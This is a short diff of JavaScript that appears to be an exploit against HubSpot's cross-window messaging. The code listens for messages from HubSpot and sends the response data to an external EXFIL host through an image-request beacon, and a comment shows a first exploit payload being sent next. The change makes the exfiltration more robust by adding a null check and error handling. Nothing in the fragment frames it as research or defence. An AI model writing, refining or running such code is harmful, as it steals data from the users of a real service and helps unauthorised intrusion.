@@ -49,10 +49,14 @@ try {
                 // Listen for responses from HubSpot
                 window.addEventListener('message', function(resp) {
                     log('RESPONSE_FROM=' + resp.origin);
-                    log('RESPONSE_TYPE=' + (resp.data.type || 'unknown'));
+                    log('RESPONSE_TYPE=' + ((resp.data && resp.data.type) || 'unknown'));
                     
                     // Exfiltrate the response
-                    new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 300));
+                    try {
+                        new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 300));
+                    } catch (err) {
+                        log('EXFIL_ERROR=' + err.message);
+                    }
                 });
                 
                 // Send Exploit 1: Content Assistance
